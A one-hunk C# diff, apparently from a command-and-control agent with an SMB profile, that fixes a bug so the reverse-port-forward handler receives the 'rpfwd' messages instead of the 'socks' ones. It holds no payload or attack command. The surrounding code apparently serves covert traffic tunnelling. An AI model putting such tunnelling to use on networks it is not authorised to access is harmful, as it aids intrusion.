@@ -205,7 +205,7 @@ profiles.Add("Athena.Profiles.SMB");
                 try
                 {
                     Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.rpfwd.Count} socks messages.");
-                    HandleRpFwd(args.tasking_response.socks);
+                    HandleRpFwd(args.tasking_response.rpfwd);
                 }
                 catch (Exception e)
                 {
